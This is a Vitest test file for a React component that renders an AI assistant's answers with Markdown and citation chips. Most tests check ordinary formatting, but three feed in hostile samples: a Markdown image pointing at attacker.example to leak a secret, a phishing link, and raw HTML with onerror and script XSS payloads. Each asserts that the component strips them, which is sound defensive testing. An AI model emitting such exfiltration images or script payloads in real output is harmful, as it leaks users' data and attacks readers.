import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { AnswerText } from './AnswerText'

const render = (text: string) => renderToStaticMarkup(<AnswerText text={text} />)

describe('AnswerText', () => {
  it('renders Markdown emphasis instead of showing the asterisks', () => {
    const html = render('You may carry over **up to 5 unused annual leave days**. [1]')
    expect(html).toContain('<strong>up to 5 unused annual leave days</strong>')
    expect(html).not.toContain('**')
  })

  it('turns citation markers into chips that point at their source cards', () => {
    const html = render('Use the VPN [1] and report incidents [1, 2].')
    expect(html.match(/class="citation-chip"/g)).toHaveLength(3)
    expect(html).toContain('href="#source-1"')
    expect(html).toContain('href="#source-2"')
    expect(html).toContain('aria-label="Source 2"')
    expect(html).not.toContain('[1]')
  })

  it('renders lists', () => {
    const html = render('Eligible items:\n\n- a desk\n- a monitor')
    expect(html).toContain('<li>a desk</li>')
    expect(html).toContain('<li>a monitor</li>')
  })

  it('keeps separate paragraphs', () => {
    const html = render('First point [1].\n\nSecond point.')
    expect(html).toContain('<p>First point <a')
    expect(html).toContain('<p>Second point.</p>')
  })

  it('never renders images, so a URL in the answer is never fetched', () => {
    const html = render('Done. ![logo](https://attacker.example/leak?q=secret) [1]')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('attacker.example')
  })

  it('shows external link text without creating a link', () => {
    const html = render('See [the expense policy](https://attacker.example/phish). [1]')
    expect(html).not.toContain('attacker.example')
    expect(html).toContain('<span>the expense policy</span>')
    // The only link left is the citation chip.
    expect(html.match(/<a /g)).toHaveLength(1)
  })

  it('does not render raw HTML', () => {
    const html = render('Hi <img src="x" onerror="alert(1)"> <script>alert(1)</script> [1]')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('onerror')
  })
})
